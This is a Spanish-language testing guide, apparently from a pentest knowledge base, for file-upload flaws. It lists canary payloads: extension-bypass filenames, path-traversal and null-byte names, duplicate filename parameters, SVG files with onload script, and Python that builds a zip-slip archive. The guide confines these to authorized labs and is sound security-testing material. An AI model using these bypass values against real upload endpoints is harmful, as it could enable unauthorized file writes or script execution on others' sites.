# 🗡️ Vulnerabilidades de subida de archivos: payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

> **Lectura del banco:** cuando un bloque enumera varias URL, rutas, cabeceras o cuerpos, cada línea suele ser una alternativa. Elegir la variante que corresponde al motor, parser y flujo real.

## 💉 Payloads básicos

### Nombres y extensiones de control

```text
canary.txt
canary.png
canary.svg
canary.jpeg
canary.pdf
canary.json
```

**Cuándo usarlo:** Subir contenido inerte a una cuenta propia y registrar nombre final, Content-Type y origen.

**Fuente:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/README.md).


### Multipart con tipo declarado distinto del contenido

```http
POST /api/upload HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
Content-Type: multipart/form-data; boundary=canary

--canary
Content-Disposition: form-data; name="file"; filename="canary.txt"
Content-Type: image/png

CANARY-{NONCE}
--canary--
```

**Cuándo usarlo:** Las líneas requieren CRLF en una request real; aceptación no equivale a ejecución.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/file-upload).


## 🧭 Payloads por contexto

### Nombres que fuerzan decisiones distintas de parser

```text
canary.php.jpg
canary.jpg.php
canary.PhP
canary.php%00.jpg
../canary-{NONCE}.txt
canary.jpg.
```

**Cuándo usarlo:** Las variantes con NUL o traversal son principalmente legacy/laboratorio; verificar ruta almacenada.

**Fuente:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/README.md).


## 🔥 Payloads avanzados

### SVG activo con canary local

```xml
<svg xmlns="http://www.w3.org/2000/svg"
     onload="document.documentElement.dataset.canary='CANARY-{NONCE}'">
  <text x="5" y="15">prueba</text>
</svg>
```

**Cuándo usarlo:** Abrir como documento SVG propio; cargarlo en <img> no suele ejecutar scripts. Confirmar origen y CSP.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/file-upload).


### Archivo comprimido con ruta de salida

```python
import zipfile
with zipfile.ZipFile("canary.zip", "w") as z:
    z.writestr("../canary-{NONCE}.txt", "prueba controlada")
```

**Cuándo usarlo:** Solo en sandbox: verificar que el extractor rechaza el escape. No sobrescribir archivos preexistentes.

**Fuente:** [OWASP WSTG](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/10-Business_Logic/09-Upload_of_Malicious_Files/).


## 🔬 Pruebas guiadas por escenario

### 1. MIME declarado incorrecto

**Objetivo:** Distinguir validación por cabecera cliente frente a contenido.

```http
POST /api/upload HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
Content-Type: multipart/form-data; boundary=prueba

--prueba
Content-Disposition: form-data; name="file"; filename="canary.txt"
Content-Type: image/png

CANARY-{NONCE}
--prueba--
```

**Interpretación:** Inspeccionar tipo y ubicación del archivo servido; aceptar un archivo no implica ejecución.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/file-upload).

### 2. Firma de archivo frente a extensión

**Objetivo:** Comprobar si el backend mira magic bytes y formato completo.

```bash
printf "CANARY-{NONCE}" > canary.png; file canary.png
```

**Interpretación:** Subir solo a cuenta propia. Si se acepta por extensión, evaluar cómo se sirve; no declarar ejecución.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files).

### 3. Doble extensión

**Objetivo:** Observar cómo normaliza nombre el almacenamiento y el servidor.

```text
canary.php.jpg
```

**Interpretación:** Usar contenido inerte y registrar nombre final/Content-Type; la extensión por sí sola no prueba RCE.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/file-upload).

### 4. Mayúsculas en extensión

**Objetivo:** Detectar listas negras sensibles a capitalización.

```text
canary.PhP
```

**Interpretación:** Solo en laboratorio que permita extensiones ejecutables; no subir código activo a servicios compartidos.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files).

### 5. Punto o espacio final

**Objetivo:** Comprobar normalización de nombre entre sistema de archivos y servidor.

```text
canary.jpg.
canary.jpg%20
```

**Interpretación:** Comparar el nombre almacenado y el nombre servido; depende de sistema operativo y proxy.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files).

### 6. SVG con marcador DOM

**Objetivo:** Comprobar si SVG subido se sirve como contenido activo en mismo origen.

```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="document.documentElement.setAttribute('data-prueba','CANARY-{NONCE}')"></svg>
```

**Interpretación:** Abrir el SVG propio como documento y verificar el atributo en ese origen. Embebido como img no ejecuta el script; Content-Disposition: attachment puede impedirlo.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/file-upload).

### 7. Nombre con traversal

**Objetivo:** Verificar que filename no controla la ruta de almacenamiento.

```http
Content-Disposition: form-data; name="file"; filename="../canary-{NONCE}.txt"
```

**Interpretación:** El backend debe renombrar o rechazar. Comprobar únicamente directorios de laboratorio propios.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files).

### 8. PUT directo a recurso propio

**Objetivo:** Comprobar si una ruta de subida no pasa por el formulario.

```http
PUT /uploads/canary-{NONCE}.txt HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
Content-Type: text/plain

CANARY-{NONCE}
```

**Interpretación:** Revisar si el archivo se creó y su acceso. No intentar sobrescribir rutas existentes.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/file-upload).

### 9. ZIP con entrada de traversal

**Objetivo:** Solo en extractor aislado, comprobar si una entrada del archivo sale del directorio previsto.

```python
import zipfile
with zipfile.ZipFile("zip-slip-lab.zip","w") as z:
    z.writestr("../canary-{NONCE}.txt","CANARY-{NONCE}")
```

**Interpretación:** El ZIP solo prepara el canary; confirmar una escritura fuera del directorio al extraer en laboratorio y borrar el archivo.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Zip%20Slip/README.md).

### 10. Content-Type servido

**Objetivo:** Confirmar que el navegador no recibe HTML activo del mismo origen.

```bash
curl -I "https://{ORIGEN}/uploads/canary-{NONCE}.txt"
```

**Interpretación:** Comprobar `Content-Type`, `Content-Disposition` y origen de entrega; HEAD puede diferir de GET.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/file-upload).

### 11. Dos parámetros filename

**Objetivo:** Verificar si validador y almacenamiento eligen distinto nombre.

```http
Content-Disposition: form-data; name="file"; filename="canary.txt"; filename="canary.php"
```

**Interpretación:** Usar contenido inerte y laboratorio. Registrar nombre final y tipo servido, sin ejecutar código.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files).

### 12. Nombre con byte nulo

**Objetivo:** Probar truncamiento de filename en una implementación legacy.

```text
canary.php%00.jpg
```

**Interpretación:** Los stacks modernos rechazan NUL. Solo es relevante si se almacena/ejecuta con extensión distinta.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files).

### 13. SVG servido en origen separado

**Objetivo:** Comparar el origen de un SVG activo propio con el de la aplicación.

```text
Navegar directamente a https://{ORIGEN_ARCHIVOS}/uploads/canary-{NONCE}.svg
```

**Interpretación:** Un img no ejecuta scripts de SVG. En navegación directa, confirmar origen, Content-Type, Content-Disposition y política CSP.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/file-upload).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
